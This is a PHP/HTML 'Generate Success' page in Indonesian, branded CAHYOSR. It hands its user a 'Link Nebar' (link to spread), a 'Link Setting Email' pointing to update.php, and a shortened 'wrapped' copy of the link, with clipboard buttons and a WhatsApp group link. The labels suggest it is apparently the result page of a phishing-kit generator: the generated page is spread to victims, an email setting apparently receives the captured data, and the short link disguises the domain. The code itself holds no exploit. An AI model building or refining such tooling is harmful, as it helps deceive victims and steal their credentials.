<?php
include 'shortlink.php';

$subdomain = $_GET['folder'];
$domain = $_SERVER['SERVER_NAME'];

/* link normal (TETAP https) */
$linkNebar   = "https://" . $domain . "/" . $subdomain;
$linkSetting = "https://" . $domain . "/" . $subdomain . "/update.php";
$linkUpdate  = "https://" . $domain . "/" . $subdomain . "/update.php";

/* khusus shortlink (TANPA https) */
$longURL = $domain . "/" . $subdomain;
$shortenedURL = shortenURL($longURL);
?>

<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
  <title>GENERATE SUCCESS</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet" />
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap');

    body {
      font-family: 'Plus Jakarta Sans', sans-serif;
      background-color: #fcfcfc;
      color: #111;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 1.5rem;
    }

    .main-card {
      background: #ffffff;
      border-top: 10px solid #ff0000;
      box-shadow: 0 30px 60px rgba(0, 0, 0, 0.12);
      border-radius: 2.5rem;
      max-width: 450px;
      width: 100%;
      padding: 2.5rem;
      border-left: 1px solid #eee;
      border-right: 1px solid #eee;
    }

    .input-box {
      background-color: #f9f9f9;
      border: 1.5px solid #eee;
      color: #000;
      border-radius: 1rem;
      padding: 0.75rem 1rem;
      width: 100%;
      font-size: 0.8rem;
      font-weight: 600;
      margin-bottom: 1rem;
      user-select: all;
      outline: none;
    }

    label {
      display: block;
      font-weight: 800;
      font-size: 10px;
      margin-bottom: 0.5rem;
      color: #ff0000;
      text-transform: uppercase;
      letter-spacing: 1px;
      padding-left: 5px;
    }

    .btn-action {
      transition: all 0.3s ease;
      font-weight: 800;
      text-transform: uppercase;
      letter-spacing: 0.5px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      font-size: 11px;
    }

    .btn-action:active { transform: scale(0.96); }
    .btn-red { background: #ff0000; color: white; }
    .btn-black { background: #000000; color: white; }
    .btn-outline { border: 2px solid #000; color: #000; background: transparent; }

    #toast {
      position: fixed;
      top: 2rem;
      left: 50%;
      transform: translateX(-50%);
      background: #000;
      color: #fff;
      padding: 0.8rem 1.8rem;
      border-radius: 1rem;
      font-weight: 800;
      font-size: 0.75rem;
      display: none;
      z-index: 9999;
      box-shadow: 0 10px 20px rgba(0,0,0,0.3);
    }
  </style>
</head>
<body>

  <div id="toast">DISALIN!</div>

  <div class="main-card">
    <div class="text-center mb-8">
        <div class="w-16 h-16 bg-black text-white rounded-2xl flex items-center justify-center mx-auto mb-3 shadow-lg">
          <i class="fas fa-check-double text-red-600 text-2xl"></i>
        </div>
        <h1 class="text-2xl font-black italic uppercase tracking-tighter">CAHYO<span class="text-red-600">SR</span></h1>
        <p class="text-gray-400 text-[9px] font-bold uppercase tracking-widest">Generate Success</p>
    </div>

    <div class="mb-6">
      <div>
        <label for="link-nebar">Link Nebar</label>
        <input id="link-nebar" type="text" readonly class="input-box" value="<?= htmlspecialchars($linkNebar) ?>">
      </div>
      <div>
        <label for="link-setting">Link Setting Email</label>
        <input id="link-setting" type="text" readonly class="input-box" value="<?= htmlspecialchars($linkSetting) ?>">
      </div>
      <div>
        <label for="link-short">Link Web Sudah Di Bungkus</label>
        <input id="link-short" type="text" readonly class="input-box" value="<?= htmlspecialchars($shortenedURL) ?>">
      </div>
    </div>

    <div class="grid grid-cols-1 gap-3">
      <button onclick="window.open(document.getElementById('link-nebar').value, '_blank')" class="btn-action btn-red w-full py-4 rounded-2xl shadow-xl shadow-red-200">
        <i class="fas fa-external-link-alt"></i>
        <span>Open Web</span>
      </button>

      <button onclick="window.location.href='<?= htmlspecialchars($linkUpdate) ?>'" class="btn-action btn-black w-full py-4 rounded-2xl shadow-xl">
        <i class="fas fa-cog"></i>
        <span>Buka Setting</span>
      </button>

      <button onclick="copySingle('link-short')" class="btn-action btn-outline w-full py-4 rounded-2xl">
        <i class="fas fa-link text-red-600"></i>
        <span>Salin Short Link</span>
      </button>

      <button onclick="copyAllData()" class="btn-action bg-gray-100 text-black border border-gray-200 w-full py-4 rounded-2xl hover:bg-black hover:text-white transition-all">
        <i class="fas fa-copy text-red-600"></i>
        <span>Copy All Data</span>
      </button>
    </div>

    <div class="mt-8">
      <a href="https://chat.whatsapp.com/Evv0s273GXt7CHwPO7" target="_blank" class="block w-full py-4 bg-black text-white rounded-2xl text-[10px] font-black uppercase tracking-widest hover:bg-red-600 transition-all text-center shadow-xl">
        
      </a>
    </div>
  </div>

  <script>
    function showToast(msg) {
      const toast = document.getElementById('toast');
      toast.textContent = msg;
      toast.style.display = 'block';
      setTimeout(() => { toast.style.display = 'none'; }, 2000);
    }

    function copySingle(id) {
      const val = document.getElementById(id).value;
      navigator.clipboard.writeText(val).then(() => {
        showToast("LINK DISALIN!");
      });
    }

    function copyAllData() {
      const nebar = document.getElementById('link-nebar').value;
      const setting = document.getElementById('link-setting').value;
      const short = document.getElementById('link-short').value;
      
      const allText = `Link Nebar: ${nebar}\nLink Setting: ${setting}\nLink Short: ${short}`;
      
      navigator.clipboard.writeText(allText).then(() => {
        showToast("SEMUA DATA DISALIN!");
      });
    }
  </script>

</body>
</html>
